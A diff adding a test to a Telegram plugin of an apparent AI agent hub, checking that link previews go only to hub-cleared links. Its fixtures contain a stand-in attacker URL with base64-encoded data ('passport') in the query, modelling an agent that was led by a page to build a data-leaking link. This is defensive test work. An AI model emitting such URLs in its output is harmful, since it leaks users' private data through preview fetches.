@@ -147,6 +147,28 @@ describe("telegram plugin", () => {
     expect(sent.params.text).toBe("<blockquote><i>You, in the web app:</i> где кофе &lt;в турке&gt;?</blockquote>\nКофе в <b>турке</b>");
   });
 
+  it("previews only the link the hub cleared, in its own part of a long reply; otherwise none", async () => {
+    let from = tg.calls.length;
+    // A link the hub did not clear (an address the agent put together after reading a page): no preview.
+    await h.channelSend("telegram", { kind: "reply", text: "Готово: ![p](https://pics.attacker.test/p.png?d=cGFzc3BvcnQ) и https://news.example.org/a" });
+    const plain = await tg.waitFor("sendMessage", (p) => p.text.includes("Готово"), { from });
+    expect(plain.params.link_preview_options).toEqual({ is_disabled: true });
+
+    from = tg.calls.length;
+    await h.channelSend("telegram", { kind: "reply", text: "![p](https://pics.attacker.test/p.png?d=cGFzc3BvcnQ) Источник: https://news.example.org/a", preview: "https://news.example.org/a" });
+    const cleared = await tg.waitFor("sendMessage", (p) => p.text.includes("Источник"), { from });
+    // Pinned to that link: Telegram's servers fetch nothing else of the message.
+    expect(cleared.params.link_preview_options).toEqual({ url: "https://news.example.org/a" });
+
+    from = tg.calls.length;
+    const long = Array.from({ length: 300 }, (_, i) => `Строка ${i} без ссылок.`).join("\n");
+    await h.channelSend("telegram", { kind: "reply", text: `https://pics.attacker.test/x?d=1\n${long}\nПодробнее: https://news.example.org/b`, preview: "https://news.example.org/b" });
+    await tg.waitFor("sendMessage", (p) => p.text.includes("Подробнее"), { from });
+    const parts = tg.calls.slice(from).filter((c) => c.method === "sendMessage");
+    expect(parts.length).toBeGreaterThan(1);
+    expect(parts.map((c) => c.params.link_preview_options)).toEqual([...parts.slice(1).map(() => ({ is_disabled: true })), { url: "https://news.example.org/b" }]);
+  });
+
   it("handles /stop, /tasks and non-text messages", async () => {
     let from = tg.calls.length;
     tg.push(privateMsg(OWNER, "/stop"));
